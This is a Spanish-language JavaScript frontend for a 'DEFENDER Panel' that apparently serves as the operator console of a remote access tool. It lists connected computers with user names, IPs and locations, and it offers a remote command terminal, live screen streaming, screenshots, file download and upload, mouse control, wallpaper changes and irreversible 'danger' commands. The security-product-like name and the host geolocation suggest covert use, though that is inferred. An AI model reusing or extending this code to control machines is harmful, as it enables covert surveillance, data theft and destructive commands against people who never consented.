// =============================================
// DEFENDER Panel — Frontend Application
// =============================================

let socket = null;
let authToken = null;
let currentUser = null;
let selectedDeviceId = null;
let devices = [];
let isStreaming = false;
let streamFrameCount = 0;
let streamStartTime = 0;
let commandHistory = [];
let historyIndex = -1;

// =============================================
// INITIALIZATION
// =============================================
document.addEventListener('DOMContentLoaded', () => {
  createParticles();
  startClock();

  // Check saved token
  const saved = localStorage.getItem('defender_token');
  if (saved) {
    authToken = saved;
    currentUser = JSON.parse(localStorage.getItem('defender_user') || '{}');
    initDashboard();
  }
});

// =============================================
// LOGIN
// =============================================
document.getElementById('login-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const user = document.getElementById('login-user').value;
  const pass = document.getElementById('login-pass').value;
  const btn = document.getElementById('btn-login');
  const errorEl = document.getElementById('login-error');

  btn.classList.add('loading');
  errorEl.textContent = '';

  try {
    const res = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: user, password: pass })
    });

    const data = await res.json();
    if (!res.ok) throw new Error(data.error || 'Error de login');

    authToken = data.token;
    currentUser = data.user;
    localStorage.setItem('defender_token', authToken);
    localStorage.setItem('defender_user', JSON.stringify(currentUser));

    initDashboard();
  } catch (err) {
    errorEl.textContent = '❌ ' + err.message;
    btn.classList.remove('loading');
  }
});

function logout() {
  localStorage.removeItem('defender_token');
  localStorage.removeItem('defender_user');
  authToken = null;
  if (socket) socket.disconnect();
  document.getElementById('dashboard').classList.add('hidden');
  document.getElementById('login-screen').classList.remove('hidden');
  document.getElementById('login-user').value = '';
  document.getElementById('login-pass').value = '';
  document.getElementById('login-error').textContent = '';
  document.getElementById('btn-login').classList.remove('loading');
}

// =============================================
// DASHBOARD INIT
// =============================================
function initDashboard() {
  document.getElementById('login-screen').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  document.getElementById('current-user').textContent = currentUser.username;
  document.getElementById('btn-login').classList.remove('loading');

  connectSocket();
}

// =============================================
// SOCKET.IO CONNECTION
// =============================================
function connectSocket() {
  socket = io({ auth: { type: 'panel', token: authToken } });

  socket.on('connect', () => {
    showToast('Conectado al servidor', 'success');
  });

  socket.on('connect_error', (err) => {
    if (err.message === 'Token inválido') {
      logout();
      showToast('Sesión expirada', 'error');
    }
  });

  socket.on('devices-update', (data) => {
    devices = data;
    renderDevices();
    updateDeviceSelector();
    updateOnlineCount();
  });

  socket.on('device-connected', (data) => {
    showToast(`🟢 ${data.pcName || 'Dispositivo'} conectado`, 'success');
  });

  socket.on('device-disconnected', (data) => {
    showToast(`🔴 Dispositivo desconectado`, 'warning');
    if (data.deviceId === selectedDeviceId && isStreaming) {
      stopScreenStream();
    }
  });

  socket.on('command-result', (data) => {
    if (data.deviceId === selectedDeviceId) {
      appendTerminalResult(data.command, data.result, data.error);
    }
  });

  socket.on('screenshot-result', (data) => {
    if (data.deviceId === selectedDeviceId) {
      showScreenshot(data.image);
      showToast('📸 Screenshot capturado', 'info');
    }
  });

  socket.on('screen-frame', (data) => {
    if (data.deviceId === selectedDeviceId && isStreaming) {
      displayFrame(data.frame);
    }
  });

  socket.on('ls-result', (data) => {
    if (data.deviceId === selectedDeviceId) {
      renderFileList(data);
    }
  });

  socket.on('processes-result', (data) => {
    if (data.deviceId === selectedDeviceId) {
      appendTerminalResult('processes', data.result);
    }
  });

  socket.on('file-data', (data) => {
    if (data.deviceId === selectedDeviceId) {
      downloadBase64File(data.filename, data.data, data.mimetype);
    }
  });
}

// =============================================
// DEVICES RENDERING
// =============================================
function renderDevices() {
  const grid = document.getElementById('devices-grid');
  const noDevices = document.getElementById('no-devices');

  if (devices.length === 0) {
    grid.innerHTML = '';
    grid.appendChild(noDevices);
    noDevices.classList.remove('hidden');
    return;
  }

  noDevices.classList.add('hidden');
  grid.innerHTML = devices.map((d, i) => `
    <div class="device-card ${d.is_online ? 'online' : 'offline'} animate-fadeIn"
         style="animation-delay: ${i * 0.08}s"
         onclick="selectDevice('${d.id}')">
      <div class="device-card-header">
        <div class="device-icon">${d.is_online ? '💻' : '🖥️'}</div>
        <div class="device-card-title">
          <h3>${escapeHtml(d.pc_name || 'Desconocido')}</h3>
          <span class="device-user">👤 ${escapeHtml(d.username || 'N/A')}</span>
        </div>
        <div class="device-status">
          <span class="dot ${d.is_online ? 'online' : 'offline'}"></span>
          <span style="color: ${d.is_online ? 'var(--green)' : 'var(--red)'}">
            ${d.is_online ? 'Online' : 'Offline'}
          </span>
        </div>
      </div>
      <div class="device-card-details">
        <div class="detail-item">
          <span>🖥️</span>
          <span>${escapeHtml(d.os || 'N/A')}</span>
        </div>
        <div class="detail-item">
          <span>🌐</span>
          <span>${escapeHtml(d.public_ip || 'N/A')}</span>
        </div>
        <div class="detail-item">
          <span>📍</span>
          <span>${escapeHtml((d.location || 'N/A').substring(0, 30))}</span>
        </div>
        <div class="detail-item">
          <span>🕐</span>
          <span>${d.last_seen ? timeSince(d.last_seen) : 'N/A'}</span>
        </div>
      </div>
      <div class="device-card-actions">
        <button class="btn-device-action" onclick="event.stopPropagation(); selectDevice('${d.id}'); switchView('terminal')">
          ⌨️ Terminal
        </button>
        <button class="btn-device-action" onclick="event.stopPropagation(); selectDevice('${d.id}'); switchView('screen')">
          🖥️ Screen
        </button>
        <button class="btn-device-action" onclick="event.stopPropagation(); selectDevice('${d.id}'); switchView('files')">
          📁 Files
        </button>
        <button class="btn-device-action" onclick="event.stopPropagation(); selectDevice('${d.id}'); switchView('controls')">
          🎮 Control
        </button>
      </div>
    </div>
  `).join('');
}

function updateOnlineCount() {
  const online = devices.filter(d => d.is_online).length;
  document.getElementById('online-count').textContent = online;
  document.getElementById('device-count').textContent = devices.length;
}

function updateDeviceSelector() {
  const select = document.getElementById('device-selector');
  const current = select.value;
  select.innerHTML = '<option value="">— Seleccionar dispositivo —</option>' +
    devices.filter(d => d.is_online).map(d =>
      `<option value="${d.id}" ${d.id === selectedDeviceId ? 'selected' : ''}>
        ${d.is_online ? '🟢' : '🔴'} ${escapeHtml(d.pc_name)} (${escapeHtml(d.username)})
      </option>`
    ).join('');
}

// =============================================
// DEVICE SELECTION
// =============================================
function selectDevice(deviceId) {
  selectedDeviceId = deviceId;
  const device = devices.find(d => d.id === deviceId);
  if (!device) return;

  // Update selector
  document.getElementById('device-selector').value = deviceId;
  document.getElementById('selected-device-info').textContent =
    `🟢 ${device.pc_name} — ${device.public_ip || ''}`;

  // Enable terminal
  document.getElementById('terminal-input').disabled = false;
  document.getElementById('btn-send-cmd').disabled = false;
  document.getElementById('terminal-title').textContent =
    `Terminal — ${device.pc_name} (${device.username})`;

  // Update sysinfo card
  updateSysinfoCard(device);

  showToast(`Dispositivo seleccionado: ${device.pc_name}`, 'info');
}

function selectDeviceFromDropdown() {
  const id = document.getElementById('device-selector').value;
  if (id) selectDevice(id);
}

function updateSysinfoCard(device) {
  const el = document.getElementById('sysinfo-content');
  el.innerHTML = `
    <div class="sysinfo-grid">
      <div class="sysinfo-item"><span class="sysinfo-label">PC</span><span class="sysinfo-value">${escapeHtml(device.pc_name)}</span></div>
      <div class="sysinfo-item"><span class="sysinfo-label">Usuario</span><span class="sysinfo-value">${escapeHtml(device.username)}</span></div>
      <div class="sysinfo-item"><span class="sysinfo-label">OS</span><span class="sysinfo-value">${escapeHtml(device.os || 'N/A')}</span></div>
      <div class="sysinfo-item"><span class="sysinfo-label">IP</span><span class="sysinfo-value">${escapeHtml(device.public_ip || 'N/A')}</span></div>
      <div class="sysinfo-item"><span class="sysinfo-label">IP Local</span><span class="sysinfo-value">${escapeHtml(device.local_ip || 'N/A')}</span></div>
      <div class="sysinfo-item"><span class="sysinfo-label">Ubicación</span><span class="sysinfo-value">${escapeHtml(device.location || 'N/A')}</span></div>
      <div class="sysinfo-item"><span class="sysinfo-label">CPU</span><span class="sysinfo-value">${escapeHtml(device.cpu || 'N/A')}</span></div>
      <div class="sysinfo-item"><span class="sysinfo-label">RAM</span><span class="sysinfo-value">${escapeHtml(device.ram || 'N/A')}</span></div>
    </div>
  `;
}

// =============================================
// VIEW SWITCHING
// =============================================
function switchView(viewName) {
  // Update nav
  document.querySelectorAll('.nav-item').forEach(el => {
    el.classList.toggle('active', el.dataset.view === viewName);
  });

  // Update views
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  const view = document.getElementById(`view-${viewName}`);
  if (view) view.classList.add('active');

  // Update title
  const titles = {
    devices: 'Dispositivos Conectados',
    terminal: 'Terminal Remota',
    screen: 'View Screen — Tiempo Real',
    files: 'Explorador de Archivos',
    controls: 'Panel de Control'
  };
  document.getElementById('page-title').textContent = titles[viewName] || viewName;

  // Show device selector for non-devices views
  const bar = document.getElementById('device-selector-bar');
  if (viewName === 'devices') {
    bar.classList.add('hidden');
  } else {
    bar.classList.remove('hidden');
  }

  // Auto-load data when switching views
  if (selectedDeviceId && viewName === 'files') {
    requestLs();
  }
}

// =============================================
// TERMINAL
// =============================================
function handleTerminalKey(event) {
  if (event.key === 'Enter') {
    sendTerminalCommand();
  } else if (event.key === 'ArrowUp') {
    event.preventDefault();
    if (historyIndex < commandHistory.length - 1) {
      historyIndex++;
      document.getElementById('terminal-input').value = commandHistory[commandHistory.length - 1 - historyIndex];
    }
  } else if (event.key === 'ArrowDown') {
    event.preventDefault();
    if (historyIndex > 0) {
      historyIndex--;
      document.getElementById('terminal-input').value = commandHistory[commandHistory.length - 1 - historyIndex];
    } else {
      historyIndex = -1;
      document.getElementById('terminal-input').value = '';
    }
  }
}

function sendTerminalCommand() {
  const input = document.getElementById('terminal-input');
  const cmd = input.value.trim();
  if (!cmd || !selectedDeviceId) return;

  commandHistory.push(cmd);
  historyIndex = -1;
  input.value = '';

  appendTerminalLine(cmd, 'cmd');

  // Parse command
  const parts = cmd.split(' ');
  const command = parts[0].replace('!', '');
  const args = parts.slice(1).join(' ');

  socket.emit('send-command', { deviceId: selectedDeviceId, command, args });
}

function quickCmd(cmd) {
  if (!selectedDeviceId) {
    showToast('Selecciona un dispositivo primero', 'warning');
    return;
  }

  appendTerminalLine(cmd, 'cmd');

  if (cmd === 'screenshot') {
    socket.emit('request-screenshot', { deviceId: selectedDeviceId });
    appendTerminalLine('📸 Solicitando captura de pantalla...', 'system');
  } else if (cmd === 'processes') {
    socket.emit('request-processes', { deviceId: selectedDeviceId });
    appendTerminalLine('⚙️ Obteniendo lista de procesos...', 'system');
  } else {
    socket.emit('send-command', { deviceId: selectedDeviceId, command: cmd, args: '' });
  }
}

function sendCmd(command, args) {
  if (!selectedDeviceId) {
    showToast('Selecciona un dispositivo primero', 'warning');
    return;
  }
  socket.emit('send-command', { deviceId: selectedDeviceId, command, args: args || '' });
  showToast(`Comando enviado: ${command}`, 'info');
}

function appendTerminalLine(text, type) {
  const body = document.getElementById('terminal-body');
  const welcome = body.querySelector('.terminal-welcome');
  if (welcome) welcome.remove();

  const line = document.createElement('div');
  line.className = `terminal-line ${type}`;
  line.textContent = text;
  body.appendChild(line);
  body.scrollTop = body.scrollHeight;
}

function appendTerminalResult(command, result, isError) {
  const type = isError ? 'error' : 'result';
  appendTerminalLine(result || '(sin respuesta)', type);
}

function clearTerminal() {
  const body = document.getElementById('terminal-body');
  body.innerHTML = '';
  appendTerminalLine('Terminal limpiada', 'system');
}

// =============================================
// SCREEN STREAMING
// =============================================
function toggleScreenStream() {
  if (isStreaming) {
    stopScreenStream();
  } else {
    startScreenStream();
  }
}

function startScreenStream() {
  if (!selectedDeviceId) {
    showToast('Selecciona un dispositivo primero', 'warning');
    return;
  }

  const quality = document.getElementById('stream-quality').value;
  isStreaming = true;
  streamFrameCount = 0;
  streamStartTime = Date.now();

  socket.emit('start-screen-stream', {
    deviceId: selectedDeviceId,
    fps: 2,
    quality: parseInt(quality)
  });

  const btn = document.getElementById('btn-start-stream');
  btn.textContent = '⏹ Detener Stream';
  btn.classList.add('streaming');

  document.getElementById('stream-status').textContent = '🔴 LIVE';
  document.getElementById('stream-status').className = 'stream-badge live';
  document.getElementById('screen-placeholder').classList.add('hidden');
  document.getElementById('screen-image').classList.remove('hidden');

  showToast('🖥️ Stream iniciado', 'success');

  // FPS counter
  window.fpsInterval = setInterval(() => {
    const elapsed = (Date.now() - streamStartTime) / 1000;
    const fps = elapsed > 0 ? (streamFrameCount / elapsed).toFixed(1) : 0;
    document.getElementById('stream-fps').textContent = `${fps} FPS`;
  }, 1000);
}

function stopScreenStream() {
  isStreaming = false;
  socket.emit('stop-screen-stream', { deviceId: selectedDeviceId });

  const btn = document.getElementById('btn-start-stream');
  btn.textContent = '▶️ Iniciar View Screen';
  btn.classList.remove('streaming');

  document.getElementById('stream-status').textContent = '⏹ Detenido';
  document.getElementById('stream-status').className = 'stream-badge offline';
  document.getElementById('stream-fps').textContent = '0 FPS';

  if (window.fpsInterval) clearInterval(window.fpsInterval);
}

function displayFrame(frameData) {
  const img = document.getElementById('screen-image');
  img.src = 'data:image/jpeg;base64,' + frameData;
  streamFrameCount++;
}

function requestScreenshot() {
  if (!selectedDeviceId) {
    showToast('Selecciona un dispositivo primero', 'warning');
    return;
  }
  socket.emit('request-screenshot', { deviceId: selectedDeviceId });
  showToast('📸 Capturando pantalla...', 'info');
}

function showScreenshot(base64) {
  const img = document.getElementById('screen-image');
  img.src = 'data:image/jpeg;base64,' + base64;
  img.classList.remove('hidden');
  document.getElementById('screen-placeholder').classList.add('hidden');

  // Also open in modal
  document.getElementById('modal-screenshot-img').src = img.src;
  document.getElementById('screenshot-modal').classList.remove('hidden');
}

function updateQualityLabel() {
  document.getElementById('quality-label').textContent =
    document.getElementById('stream-quality').value + '%';
}

// =============================================
// FILE EXPLORER
// =============================================
function requestLs() {
  if (!selectedDeviceId) return;
  const pathInput = document.getElementById('files-path-input');
  socket.emit('request-ls', { deviceId: selectedDeviceId, path: pathInput.value || '.' });
}

function navigatePath() {
  requestLs();
}

function renderFileList(data) {
  const list = document.getElementById('files-list');
  document.getElementById('files-path-input').value = data.currentPath || '';

  if (!data.items || data.items.length === 0) {
    list.innerHTML = '<div class="files-placeholder">Directorio vacío</div>';
    return;
  }

  // Sort: directories first
  const items = data.items.sort((a, b) => {
    if (a.isDir && !b.isDir) return -1;
    if (!a.isDir && b.isDir) return 1;
    return a.name.localeCompare(b.name);
  });

  // Store file paths in a global map to avoid backslash issues in HTML
  window._filePaths = {};

  // Parent directory
  let html = '';
  if (data.currentPath && data.currentPath !== '/') {
    html += `<div class="file-item" ondblclick="navigateToDir('..')">
      <span class="file-icon">⬆️</span>
      <span class="file-name">..</span>
    </div>`;
  }

  html += items.map((item, idx) => {
    const key = 'f' + idx;
    window._filePaths[key] = { path: item.fullPath || item.name, name: item.name, isDir: item.isDir };
    return `
    <div class="file-item" ondblclick="${item.isDir ? `navDir('${key}')` : ''}">
      <span class="file-icon">${item.isDir ? '📁' : getFileIcon(item.name)}</span>
      <span class="file-name">${escapeHtml(item.name)}</span>
      <span class="file-size">${item.isDir ? '' : formatSize(item.size)}</span>
      ${!item.isDir ? `
        <button class="file-action" onclick="dlFile('${key}')">
          📥 Descargar
        </button>
      ` : ''}
    </div>`;
  }).join('');

  list.innerHTML = html;
}

function navDir(key) {
  const info = window._filePaths[key];
  if (!info) return;
  const pathInput = document.getElementById('files-path-input');
  pathInput.value = info.path;
  requestLs();
}

function navigateToDir(dir) {
  const pathInput = document.getElementById('files-path-input');
  if (dir === '..') {
    const parts = pathInput.value.replace(/\\/g, '/').split('/');
    parts.pop();
    pathInput.value = parts.join('/') || '/';
  } else {
    const sep = pathInput.value.includes('\\') ? '\\' : '/';
    pathInput.value = pathInput.value + sep + dir;
  }
  requestLs();
}

function dlFile(key) {
  const info = window._filePaths[key];
  if (!info) return;
  downloadFile(info.path);
}

function downloadFile(filepath) {
  if (!selectedDeviceId) return showToast('Selecciona un dispositivo', 'warning');
  socket.emit('request-download', { deviceId: selectedDeviceId, filepath });
  showToast('📥 Descargando: ' + filepath.split(/[/\\]/).pop(), 'info');
}

function uploadFile() {
  const input = document.getElementById('file-upload-input');
  const file = input.files[0];
  if (!file || !selectedDeviceId) return;

  const reader = new FileReader();
  reader.onload = () => {
    const base64 = reader.result.split(',')[1];
    const destPath = document.getElementById('files-path-input').value || '.';
    socket.emit('upload-file', {
      deviceId: selectedDeviceId,
      filename: file.name,
      data: base64,
      destPath
    });
    showToast(`📤 Subiendo: ${file.name}`, 'info');
  };
  reader.readAsDataURL(file);
  input.value = '';
}

// =============================================
// CONTROLS
// =============================================
function sendMouseMove() {
  const x = document.getElementById('mouse-x').value;
  const y = document.getElementById('mouse-y').value;
  if (!x || !y) return showToast('Ingresa coordenadas X e Y', 'warning');
  sendCmd('move_mouse', `${x} ${y}`);
}

function sendWallpaper() {
  const input = document.getElementById('wallpaper-input');
  const file = input.files[0];
  if (!file || !selectedDeviceId) return;

  const reader = new FileReader();
  reader.onload = () => {
    const base64 = reader.result.split(',')[1];
    socket.emit('send-command', {
      deviceId: selectedDeviceId,
      command: 'wallpaper',
      args: base64
    });
    showToast('🖼️ Cambiando wallpaper...', 'info');
  };
  reader.readAsDataURL(file);
  input.value = '';
}

function confirmDanger(command, message) {
  if (!selectedDeviceId) return showToast('Selecciona un dispositivo', 'warning');
  if (confirm(`⚠️ ${message}\n\nEsta acción no se puede deshacer.`)) {
    sendCmd(command);
  }
}

// =============================================
// MODAL
// =============================================
function closeModal(event) {
  if (event.target.classList.contains('modal')) {
    event.target.classList.add('hidden');
  }
}

function downloadModalImage() {
  const img = document.getElementById('modal-screenshot-img');
  const a = document.createElement('a');
  a.href = img.src;
  a.download = `screenshot_${Date.now()}.jpg`;
  a.click();
}

// =============================================
// SIDEBAR
// =============================================
function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
}

// =============================================
// TOASTS
// =============================================
function showToast(message, type = 'info') {
  const container = document.getElementById('toast-container');
  const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `<span class="toast-icon">${icons[type]}</span><span>${message}</span>`;
  toast.onclick = () => removeToast(toast);
  container.appendChild(toast);

  setTimeout(() => removeToast(toast), 4000);
}

function removeToast(toast) {
  toast.classList.add('toast-exit');
  setTimeout(() => toast.remove(), 300);
}

// =============================================
// PARTICLES (Login background)
// =============================================
function createParticles() {
  const container = document.getElementById('particles');
  if (!container) return;
  for (let i = 0; i < 30; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    p.style.left = Math.random() * 100 + '%';
    p.style.width = p.style.height = (Math.random() * 4 + 2) + 'px';
    p.style.animationDuration = (Math.random() * 15 + 10) + 's';
    p.style.animationDelay = (Math.random() * 10) + 's';
    p.style.opacity = Math.random() * 0.5;
    container.appendChild(p);
  }
}

// =============================================
// CLOCK
// =============================================
function startClock() {
  const update = () => {
    const now = new Date();
    const el = document.getElementById('topbar-clock');
    if (el) el.textContent = now.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  };
  update();
  setInterval(update, 1000);
}

// =============================================
// UTILITIES
// =============================================
function escapeHtml(str) {
  if (!str) return '';
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function escapeAttr(str) {
  return (str || '').replace(/'/g, "\\'").replace(/"/g, '&quot;');
}

function timeSince(dateStr) {
  const date = new Date(dateStr + 'Z');
  const seconds = Math.floor((Date.now() - date.getTime()) / 1000);
  if (seconds < 60) return 'Hace segundos';
  if (seconds < 3600) return `Hace ${Math.floor(seconds / 60)}m`;
  if (seconds < 86400) return `Hace ${Math.floor(seconds / 3600)}h`;
  return `Hace ${Math.floor(seconds / 86400)}d`;
}

function formatSize(bytes) {
  if (!bytes || bytes === 0) return '';
  const units = ['B', 'KB', 'MB', 'GB'];
  let i = 0;
  let size = bytes;
  while (size >= 1024 && i < 3) { size /= 1024; i++; }
  return size.toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
}

function getFileIcon(name) {
  if (!name) return '📄';
  const ext = name.split('.').pop().toLowerCase();
  const icons = {
    jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', bmp: '🖼️', svg: '🖼️', webp: '🖼️',
    mp4: '🎬', avi: '🎬', mkv: '🎬', mov: '🎬', wmv: '🎬',
    mp3: '🎵', wav: '🎵', flac: '🎵', ogg: '🎵',
    pdf: '📕', doc: '📘', docx: '📘', xls: '📗', xlsx: '📗', ppt: '📙',
    zip: '📦', rar: '📦', '7z': '📦', tar: '📦', gz: '📦',
    exe: '⚙️', msi: '⚙️', bat: '⚙️', cmd: '⚙️', ps1: '⚙️',
    txt: '📝', log: '📝', ini: '📝', cfg: '📝', conf: '📝',
    js: '💛', py: '🐍', cs: '💜', cpp: '🔵', java: '☕', html: '🌐', css: '🎨',
    json: '📋', xml: '📋', yml: '📋', yaml: '📋',
    db: '🗃️', sqlite: '🗃️', sql: '🗃️',
    dll: '🔧', sys: '🔧', iso: '💿', img: '💿'
  };
  return icons[ext] || '📄';
}

function downloadBase64File(filename, base64, mimetype) {
  const blob = new Blob([Uint8Array.from(atob(base64), c => c.charCodeAt(0))], {
    type: mimetype || 'application/octet-stream'
  });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
  showToast(`📥 Descargado: ${filename}`, 'success');
}
